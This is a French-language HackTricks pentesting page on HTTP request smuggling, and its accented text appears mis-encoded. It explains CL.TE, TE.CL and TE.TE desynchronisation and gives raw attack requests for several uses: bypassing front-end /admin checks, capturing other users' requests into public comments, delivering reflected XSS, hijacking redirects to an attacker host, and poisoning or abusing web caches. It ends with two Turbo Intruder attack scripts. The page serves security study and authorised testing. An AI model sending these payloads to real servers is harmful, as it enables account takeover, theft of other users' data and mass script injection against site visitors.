# HTTP Request Smuggling / Attaque de dÃ©synchronisation HTTP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersÃ©curitÃ©** ? Vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ? ou souhaitez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu'est-ce que c'est

Cette vulnÃ©rabilitÃ© se produit lorsqu'une **dÃ©synchronisation** entre les **proxys frontaux** et le **serveur back-end** permet Ã  un **attaquant** d'envoyer une **requÃªte HTTP** qui sera **interprÃ©tÃ©e** comme une **seule requÃªte** par les **proxys frontaux** (Ã©quilibrage de charge/reverse-proxy) et **comme 2 requÃªtes** par le **serveur back-end**.\
Cela permet Ã  un utilisateur de **modifier la prochaine requÃªte qui arrive au serveur back-end aprÃ¨s la sienne**.

### ThÃ©orie

[**SpÃ©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reÃ§u avec Ã  la fois un champ d'en-tÃªte Transfer-Encoding et un champ d'en-tÃªte Content-Length, ce dernier DOIT Ãªtre ignorÃ©.

**Content-Length**

> L'en-tÃªte d'entitÃ© Content-Length indique la taille du corps de l'entitÃ©, en octets, envoyÃ© au destinataire.

**Transfer-Encoding: chunked**

> L'en-tÃªte Transfer-Encoding spÃ©cifie la forme de codage utilisÃ©e pour transfÃ©rer en toute sÃ©curitÃ© le corps de la charge utile Ã  l'utilisateur.\
> Chunked signifie que de grandes donnÃ©es sont envoyÃ©es sous forme de sÃ©ries de fragments.

### RÃ©alitÃ©

Le **proxy frontal** (un Ã©quilibrage de charge / reverse-proxy) **traite** l'en-tÃªte _**content-length**_ ou l'en-tÃªte _**transfer-encoding**_ et le **serveur back-end** **traite l'autre** en provoquant une **dÃ©synchronisation** entre les 2 systÃ¨mes.\
Cela peut Ãªtre trÃ¨s critique car **un attaquant pourra envoyer une requÃªte** au proxy inverse qui sera **interprÃ©tÃ©e** par le serveur **back-end comme 2 requÃªtes diffÃ©rentes**. Le **danger** de cette technique rÃ©side dans le fait que le serveur **back-end interprÃ©tera** la **2Ã¨me requÃªte injectÃ©e** comme si elle **venait du client suivant** et la **requÃªte rÃ©elle** de ce client fera **partie** de la **requÃªte injectÃ©e**.

### ParticularitÃ©s

Rappelez-vous qu'en HTTP, **un caractÃ¨re de nouvelle ligne est composÃ© de 2 octets** :

* **Content-Length** : Cet en-tÃªte utilise un **nombre dÃ©cimal** pour indiquer le **nombre d'octets** du **corps** de la requÃªte. Le corps est censÃ© se terminer par le dernier caractÃ¨re, **une nouvelle ligne n'est pas nÃ©cessaire Ã  la fin de la requÃªte**.
* **Transfer-Encoding** : Cet en-tÃªte utilise dans le **corps** un **nombre hexadÃ©cimal** pour indiquer le **nombre d'octets** du **prochain fragment**. Le **fragment** doit se terminer par une **nouvelle ligne**, mais cette nouvelle ligne **n'est pas comptÃ©e** par l'indicateur de longueur. Cette mÃ©thode de transfert doit se terminer par un **fragment de taille 0 suivi de 2 nouvelles lignes** : `0`
* **Connection** : D'aprÃ¨s mon expÃ©rience, il est recommandÃ© d'utiliser **`Connection: keep-alive`** sur la premiÃ¨re requÃªte de la requÃªte Smuggling.

## Exemples de base

Ainsi, les attaques de requÃªte smuggling consistent Ã  placer Ã  la fois l'en-tÃªte `Content-Length` et l'en-tÃªte `Transfer-Encoding` dans une seule requÃªte HTTP et Ã  les manipuler de maniÃ¨re Ã  ce que les serveurs frontal et back-end traitent la requÃªte diffÃ©remment. La maniÃ¨re exacte dont cela est fait dÃ©pend du comportement des deux serveurs :

* **CL.TE** : le serveur frontal utilise l'en-tÃªte `Content-Length` et le serveur back-end utilise l'en-tÃªte `Transfer-Encoding`.
* **TE.CL** : le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur back-end utilise l'en-tÃªte `Content-Length`.
* **TE.TE** : les serveurs frontal et back-end prennent tous deux en charge l'en-tÃªte `Transfer-Encoding`, mais l'un des serveurs peut Ãªtre amenÃ© Ã  ne pas le traiter en obfusquant l'en-tÃªte d'une maniÃ¨re ou d'une autre.

### VulnÃ©rabilitÃ©s CL.TE

Ici, le serveur frontal utilise l'en-tÃªte **`Content-Length`** et le serveur back-end utilise l'en-tÃªte **`Transfer-Encoding`**. Nous pouvons effectuer une attaque simple de requÃªte smuggling HTTP de la maniÃ¨re suivante :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Notez comment `Content-Length` indique que la longueur de la requÃªte est de **30 octets** (_rappelez-vous que HTTP utilise une nouvelle ligne, donc 2 octets pour chaque nouvelle ligne_), donc le proxy inverse **enverra la requÃªte complÃ¨te** au serveur back-end, et le serveur back-end traitera l'en-tÃªte `Transfer-Encoding`, laissant `GET /404 HTTP/1.1` comme le **dÃ©but de la prochaine requÃªte** (au fait, la prochaine requÃªte sera ajoutÃ©e Ã  `Foo:x<La prochaine requÃªte commence ici>`).
### VulnÃ©rabilitÃ©s TE.CL

Ici, le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur arriÃ¨re utilise l'en-tÃªte `Content-Length`. Nous pouvons effectuer une attaque simple de dÃ©tournement de requÃªte HTTP comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

Dans ce cas, le **reverse-proxy** va **envoyer la requÃªte complÃ¨te** vers l'**arriÃ¨re-plan** comme l'indique l'en-tÃªte **`Transfer-Encoding`**. Cependant, l'**arriÃ¨re-plan** va traiter uniquement les **`7b`** (4 octets) comme indiquÃ© dans `Content-Length`. Par consÃ©quent, la requÃªte suivante sera celle qui commence par `GET /404 HTTP/1.1`.

Notez que mÃªme si l'attaque doit se terminer par un `0`, la requÃªte suivante sera ajoutÃ©e en tant que valeurs supplÃ©mentaires du paramÃ¨tre **x**.\
Notez Ã©galement que la longueur du contenu de la requÃªte intÃ©grÃ©e indiquera la longueur de la prochaine requÃªte qui sera ajoutÃ©e au paramÃ¨tre **x**. Si elle est trop petite, seuls quelques octets seront ajoutÃ©s, et si elle est trop grande (plus grande que la longueur de la prochaine requÃªte), une erreur sera gÃ©nÃ©rÃ©e pour la requÃªte suivante.

### VulnÃ©rabilitÃ©s TE.TE

Ici, les serveurs frontal et arriÃ¨re prennent en charge tous deux l'en-tÃªte `Transfer-Encoding`, mais l'un des serveurs peut Ãªtre amenÃ© Ã  ne pas le traiter en obfusquant l'en-tÃªte d'une certaine maniÃ¨re.\
Il existe potentiellement d'innombrables faÃ§ons d'obfusquer l'en-tÃªte `Transfer-Encoding`. Par exemple :

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Selon le serveur (reverse-proxy ou arriÃ¨re-plan) qui **arrÃªte de traiter** l'en-tÃªte **TE**, vous trouverez une vulnÃ©rabilitÃ© **CL.TE** ou une vulnÃ©rabilitÃ© **TE.CL**.

## DÃ©couverte de la dÃ©tournement de requÃªte HTTP

### DÃ©couverte des vulnÃ©rabilitÃ©s CL.TE en utilisant des techniques de temporisation

Si une application est vulnÃ©rable Ã  la variante CL.TE du dÃ©tournement de requÃªte, l'envoi d'une requÃªte comme celle-ci provoquera souvent un dÃ©lai :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Ã‰tant donnÃ© que le serveur frontal utilise l'en-tÃªte `Content-Length`, il ne transmettra qu'une partie de cette requÃªte, en omettant le `0`. Le serveur arriÃ¨re utilise l'en-tÃªte `Transfer-Encoding`, traite le premier fragment, puis attend l'arrivÃ©e du fragment suivant. Cela entraÃ®nera un retard observable.

Parfois, au lieu d'obtenir un dÃ©lai d'expiration, vous recevez une erreur 400 mauvaise requÃªte de l'hÃ´te final, comme dans le scÃ©nario suivant, oÃ¹ une charge utile CL.TE est envoyÃ©e :

![](<../../.gitbook/assets/image (444).png>)

Et la rÃ©ponse est une redirection contenant une erreur dans le corps, avec mÃªme la version de haproxy utilisÃ©e :

![](<../../.gitbook/assets/image (443).png>)

### Recherche de vulnÃ©rabilitÃ©s TE.CL en utilisant des techniques de synchronisation

Si une application est vulnÃ©rable Ã  la variante TE.CL de l'attaque de dÃ©tournement de requÃªte, l'envoi d'une requÃªte comme celle-ci provoquera souvent un retard :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
Depuis que le serveur frontal utilise l'en-tÃªte `Transfer-Encoding`, il ne transmettra qu'une partie de cette requÃªte, en omettant le `X`. Le serveur arriÃ¨re utilise l'en-tÃªte `Content-Length`, attend plus de contenu dans le corps du message et attend l'arrivÃ©e du contenu restant. Cela entraÃ®nera un retard observable.

### Sonder les vulnÃ©rabilitÃ©s de l'attaque de requÃªte HTTP Smuggling

Une fois que vous avez constatÃ© que les **techniques de synchronisation fonctionnent**, vous devez **sonder** si vous pouvez **modifier les requÃªtes des autres clients**.\
La maniÃ¨re la plus simple de le faire est d'essayer de corrompre vos propres requÃªtes, par exemple en faisant une demande pour `/` qui renvoie un code 404.\
Dans les [Exemples de base](./#basic-examples), nous avons dÃ©jÃ  vu des exemples de `CL.TE` et `TE.CL` qui montrent comment corrompre une requÃªte de client pour demander `/404`, provoquant une rÃ©ponse 404 lorsque le client demande une autre ressource.

**Notes**

Certaines considÃ©rations importantes doivent Ãªtre prises en compte lors de la tentative de confirmation des vulnÃ©rabilitÃ©s de l'attaque de requÃªte en interfÃ©rant avec d'autres requÃªtes :

* La requÃªte "d'attaque" et la requÃªte "normale" doivent Ãªtre envoyÃ©es au serveur en utilisant des connexions rÃ©seau diffÃ©rentes. L'envoi des deux requÃªtes via la mÃªme connexion ne prouvera pas l'existence de la vulnÃ©rabilitÃ©.
* La requÃªte "d'attaque" et la requÃªte "normale" doivent utiliser la mÃªme URL et les mÃªmes noms de paramÃ¨tres, dans la mesure du possible. Cela est dÃ» au fait que de nombreuses applications modernes routent les requÃªtes frontales vers diffÃ©rents serveurs back-end en fonction de l'URL et des paramÃ¨tres. Utiliser la mÃªme URL et les mÃªmes paramÃ¨tres augmente les chances que les requÃªtes soient traitÃ©es par le mÃªme serveur back-end, ce qui est essentiel pour que l'attaque fonctionne.
* Lors du test de la requÃªte "normale" pour dÃ©tecter toute interfÃ©rence de la requÃªte "d'attaque", vous Ãªtes en concurrence avec toutes les autres requÃªtes que l'application reÃ§oit en mÃªme temps, y compris celles des autres utilisateurs. Vous devez envoyer la requÃªte "normale" immÃ©diatement aprÃ¨s la requÃªte "d'attaque". Si l'application est occupÃ©e, vous devrez peut-Ãªtre effectuer plusieurs tentatives pour confirmer la vulnÃ©rabilitÃ©.
* Dans certaines applications, le serveur frontal fonctionne comme un rÃ©partiteur de charge et transfÃ¨re les requÃªtes vers diffÃ©rents systÃ¨mes back-end selon un algorithme de rÃ©partition de charge. Si vos requÃªtes "d'attaque" et "normale" sont transfÃ©rÃ©es vers des systÃ¨mes back-end diffÃ©rents, l'attaque Ã©chouera. C'est une raison supplÃ©mentaire pour laquelle vous devrez peut-Ãªtre essayer plusieurs fois avant de confirmer une vulnÃ©rabilitÃ©.
* Si votre attaque rÃ©ussit Ã  interfÃ©rer avec une requÃªte ultÃ©rieure, mais que ce n'Ã©tait pas la requÃªte "normale" que vous avez envoyÃ©e pour dÃ©tecter l'interfÃ©rence, cela signifie qu'un autre utilisateur de l'application a Ã©tÃ© affectÃ© par votre attaque. Si vous continuez le test, cela pourrait avoir un effet perturbateur sur les autres utilisateurs, et vous devez faire preuve de prudence.

### Forcer via les en-tÃªtes hop-by-hop

En abusant des en-tÃªtes hop-by-hop, vous pouvez indiquer au proxy de **supprimer l'en-tÃªte Content-Length ou Transfer-Encoding afin de permettre une attaque de requÃªte HTTP Smuggling**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-tÃªtes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abus de la manipulation des requÃªtes HTTP

### Contourner les contrÃ´les de sÃ©curitÃ© en frontal

Parfois, les **proxys en frontal effectuent des vÃ©rifications de sÃ©curitÃ©**. Vous pouvez les contourner en abusant de la manipulation des requÃªtes HTTP, car vous serez en mesure de **contourner les protections**. Par exemple, dans cet exemple, vous **ne pouvez pas accÃ©der Ã  `/admin` depuis l'extÃ©rieur** et le proxy en frontal vÃ©rifie cela, mais ce **proxy ne vÃ©rifie pas la requÃªte intÃ©grÃ©e** :

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### RÃ©vÃ©ler la rÃ©Ã©criture des requÃªtes en frontal <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Dans de nombreuses applications, le **serveur frontal effectue une rÃ©Ã©criture des requÃªtes** avant de les transmettre au serveur en arriÃ¨re-plan, gÃ©nÃ©ralement en ajoutant des en-tÃªtes de requÃªte supplÃ©mentaires.\
Une chose courante Ã  faire est d'**ajouter Ã  la requÃªte l'en-tÃªte** `X-Forwarded-For: <IP du client>` ou un en-tÃªte similaire pour que le serveur en arriÃ¨re-plan connaisse l'IP du client.\
Parfois, si vous pouvez **trouver les nouvelles valeurs ajoutÃ©es** Ã  la requÃªte, vous pourriez Ãªtre en mesure de **contourner les protections** et d'**accÃ©der Ã  des informations/endpoints cachÃ©s**.

Pour dÃ©couvrir comment le proxy rÃ©Ã©crit la requÃªte, vous devez **trouver un paramÃ¨tre POST dont la valeur sera reflÃ©tÃ©e** dans la rÃ©ponse. Ensuite, utilisez ce paramÃ¨tre en dernier et utilisez une exploitation comme celle-ci :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

Dans ce cas, la requÃªte suivante sera ajoutÃ©e aprÃ¨s `search=`, qui est Ã©galement **le paramÃ¨tre dont la valeur sera reflÃ©tÃ©e** dans la rÃ©ponse, il va donc **reflÃ©ter les en-tÃªtes de la prochaine requÃªte**.

Notez que **seule la longueur indiquÃ©e dans l'en-tÃªte `Content-Length` de la requÃªte intÃ©grÃ©e sera reflÃ©tÃ©e**. Si vous utilisez un nombre faible, seuls quelques octets seront reflÃ©tÃ©s, si vous utilisez un nombre plus grand que la longueur de tous les en-tÃªtes, alors la requÃªte intÃ©grÃ©e gÃ©nÃ©rera une erreur. Vous devriez donc **commencer** par un **nombre faible** et **l'augmenter** jusqu'Ã  ce que vous voyiez tout ce que vous voulez voir.\
Notez Ã©galement que cette **technique est Ã©galement exploitable avec une vulnÃ©rabilitÃ© TE.CL**, mais la requÃªte doit se terminer par `search=\r\n0`. Cependant, indÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

Enfin, notez que dans cette attaque, nous nous attaquons toujours Ã  nous-mÃªmes pour apprendre comment le proxy frontal rÃ©Ã©crit la requÃªte.

### Capturer les requÃªtes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Si vous pouvez trouver une requÃªte POST qui va enregistrer le contenu d'un des paramÃ¨tres, vous pouvez ajouter la requÃªte suivante en tant que valeur de ce paramÃ¨tre afin de stocker la requÃªte du prochain client :

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

Dans ce cas, la valeur du **paramÃ¨tre comment** va Ãªtre **enregistrÃ©e dans un commentaire** d'un article sur la page qui est **publiquement accessible**, donc un **commentaire apparaÃ®tra avec le contenu de la prochaine requÃªte**.

_Une limitation de cette technique est qu'elle ne capture gÃ©nÃ©ralement que les donnÃ©es jusqu'au dÃ©limiteur de paramÃ¨tre applicable Ã  la requÃªte dÃ©tournÃ©e. Pour les soumissions de formulaires encodÃ©s en URL, il s'agit du caractÃ¨re `&`, ce qui signifie que le contenu stockÃ© Ã  partir de la requÃªte de l'utilisateur victime se terminera au premier `&`, qui pourrait mÃªme apparaÃ®tre dans la chaÃ®ne de requÃªte._

Notez Ã©galement que cette **technique est Ã©galement exploitable avec une vulnÃ©rabilitÃ© TE.CL**, mais la requÃªte doit se terminer par `search=\r\n0`. Cependant, indÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.
### Utilisation de la contrebande de requÃªtes HTTP pour exploiter le XSS rÃ©flÃ©chi

Si la page web est Ã©galement **vulnÃ©rable au XSS rÃ©flÃ©chi**, vous pouvez exploiter la contrebande de requÃªtes HTTP pour attaquer les clients du site web. L'exploitation du XSS rÃ©flÃ©chi Ã  partir de la contrebande de requÃªtes HTTP prÃ©sente certains avantages :

* **Elle ne nÃ©cessite aucune interaction avec les utilisateurs victimes**
* Elle peut Ãªtre utilisÃ©e pour **exploiter** le comportement XSS dans des parties de la requÃªte qui **ne peuvent pas Ãªtre facilement contrÃ´lÃ©es dans une attaque XSS rÃ©flÃ©chie normale**, comme les en-tÃªtes de requÃªte HTTP.

Si un site web est vulnÃ©rable au XSS rÃ©flÃ©chi dans l'en-tÃªte User-Agent, vous pouvez utiliser cette charge utile pour l'exploiter :

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Utilisation de la contrebande de requÃªtes HTTP pour transformer une redirection sur site en une redirection ouverte <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

De nombreuses applications effectuent des redirections sur site d'une URL vers une autre et placent le nom d'hÃ´te de l'en-tÃªte `Host` de la requÃªte dans l'URL de redirection. Un exemple de cela est le comportement par dÃ©faut des serveurs web Apache et IIS, oÃ¹ une requÃªte pour un dossier sans barre oblique finale reÃ§oit une redirection vers le mÃªme dossier incluant la barre oblique finale :

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Ce comportement est gÃ©nÃ©ralement considÃ©rÃ© comme inoffensif, mais il peut Ãªtre exploitÃ© dans une attaque de contrebande de requÃªtes pour rediriger d'autres utilisateurs vers un domaine externe. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

La requÃªte contrebandÃ©e dÃ©clenchera une redirection vers le site web de l'attaquant, ce qui affectera la requÃªte de l'utilisateur suivant qui est traitÃ©e par le serveur back-end. Par exemple :

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Ici, la requÃªte de l'utilisateur Ã©tait destinÃ©e Ã  un fichier JavaScript qui Ã©tait importÃ© par une page du site web. L'attaquant peut compromettre complÃ¨tement l'utilisateur victime en renvoyant son propre JavaScript dans la rÃ©ponse.

### Utilisation de la contrebande de requÃªtes HTTP pour effectuer un empoisonnement du cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Si une partie de l'**infrastructure frontale effectue une mise en cache du contenu** (gÃ©nÃ©ralement pour des raisons de performance), il est possible de contaminer cette mise en cache en modifiant la rÃ©ponse du serveur.

Nous avons dÃ©jÃ  vu comment modifier la valeur de retour attendue du serveur en une erreur 404 (dans les [Exemples de base](./#basic-examples)), de maniÃ¨re similaire, vous pourriez faire en sorte que le serveur renvoie le contenu de /index.html lorsque la requÃªte empoisonnÃ©e demande `/static/include.js`. Ainsi, le contenu de `/static/include.js` sera mis en cache avec le contenu de `/index.html`, rendant `/static/include.js` inaccessible aux clients (DoS ?).

Remarquez que cela est encore plus intÃ©ressant si vous trouvez une **Redirection ouverte** ou une **redirection sur site vers une redirection ouverte** (derniÃ¨re section). En effet, vous pourriez Ãªtre en mesure de **modifier les valeurs du cache** de `/static/include.js` avec celles d'un script contrÃ´lÃ© par vous (rÃ©alisation d'un **XSS gÃ©nÃ©ralisÃ© Ã  tous les clients** qui tentent de tÃ©lÃ©charger la nouvelle version de `/static/include.js`).

Dans cet exemple, il sera dÃ©montrÃ© comment vous pouvez exploiter un **empoisonnement du cache + une redirection sur site vers une redirection ouverte** pour modifier le contenu du cache de `/static/include.js` afin de **servir du code JS contrÃ´lÃ©** par l'attaquant :

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Remarquez comment la requÃªte intÃ©grÃ©e demande `/post/next?postId=3`. Cette requÃªte sera redirigÃ©e vers `/post?postId=4` et **utilisera la valeur de l'en-tÃªte Host** pour indiquer le domaine. Par consÃ©quent, vous pouvez **modifier l'en-tÃªte Host** pour pointer vers le serveur de l'attaquant et la redirection utilisera ce domaine (**redirection sur site vers une redirection ouverte**).

Ensuite, **aprÃ¨s avoir empoisonnÃ© le socket**, vous devez envoyer une **requÃªte GET** vers \*\*`/static/include.js`\*\*cette requÃªte sera **empoisonnÃ©e** par la requÃªte **redirection sur site vers une redirection ouverte** et **rÃ©cupÃ©rera le contenu du script contrÃ´lÃ© par l'attaquant**.

La prochaine fois que quelqu'un demandera `/static/include.js`, les contenus mis en cache du script de l'attaquant seront servis (XSS gÃ©nÃ©ralisÃ©).
### Utilisation de la contrebande de requÃªtes HTTP pour effectuer une tromperie de cache web <a href="#utilisation-de-la-contrebande-de-requetes-http-pour-effectuer-une-tromperie-de-cache-web" id="utilisation-de-la-contrebande-de-requetes-http-pour-effectuer-une-tromperie-de-cache-web"></a>

> **Quelle est la diffÃ©rence entre l'empoisonnement de cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant fait en sorte que l'application stocke un contenu malveillant dans le cache, et ce contenu est servi depuis le cache aux autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant fait en sorte que l'application stocke un contenu sensible appartenant Ã  un autre utilisateur dans le cache, puis l'attaquant rÃ©cupÃ¨re ce contenu depuis le cache.

Dans cette variante, l'attaquant fait passer une requÃªte qui renvoie un contenu sensible spÃ©cifique Ã  l'utilisateur. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Si le **poison atteint un client qui accÃ©dait Ã  un contenu statique** tel que `/someimage.png` qui allait Ãªtre **mis en cache**. Le contenu de `/private/messages` de la victime sera mis en cache dans `/someimage.png` et l'attaquant pourra les voler.\
Notez que l'**attaquant ne sait pas quel contenu statique la victime essayait d'accÃ©der**, il est donc probablement prÃ©fÃ©rable de tester cela en effectuant l'attaque, d'attendre quelques secondes et de **charger tous** les contenus statiques et de **rechercher les donnÃ©es privÃ©es**.

### Armer la contrebande de requÃªtes HTTP avec la dÃ©synchronisation des rÃ©ponses HTTP

Vous avez trouvÃ© une vulnÃ©rabilitÃ© de contrebande de requÃªtes HTTP et vous ne savez pas comment l'exploiter. Essayez cette autre mÃ©thode d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Depuis: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Plus d'informations

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

